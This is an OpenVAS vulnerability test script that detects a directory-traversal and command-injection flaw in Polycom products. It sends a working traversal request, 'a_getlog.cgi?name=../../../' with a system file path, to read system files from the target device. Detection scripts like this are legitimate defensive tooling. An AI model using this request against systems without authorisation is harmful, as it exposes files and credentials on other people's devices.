###############################################################################
# OpenVAS Vulnerability Test
#
# Polycom Products Directory Traversal and Command Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103442");
  script_bugtraq_id(52301);
  script_version("2021-04-16T06:57:08+0000");

  script_name("Polycom Products Directory Traversal and Command Injection Vulnerabilities");

  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2012-03-06 10:45:23 +0100 (Tue, 06 Mar 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("lighttpd/banner");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Multiple Polycom products are prone to a directory-traversal
  vulnerability and a command-injection vulnerability because it fails
  to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Remote attackers can use a specially crafted request with directory-
  traversal sequences ('../') to retrieve arbitrary files in the context
  of the application. Also, attackers can execute arbitrary commands
  with the privileges of the user running the application.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52301");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Mar/18");
  script_xref(name:"URL", value:"http://blog.tempest.com.br/joao-paulo-campello/path-traversal-on-polycom-web-management-interface.html");
  script_xref(name:"URL", value:"http://www.polycom.com/");
  script_xref(name:"URL", value:"http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: lighttpd" >!< banner)exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = string("/a_getlog.cgi?name=../../../" + file);

  if(http_vuln_check(port:port, url:url,pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(99);
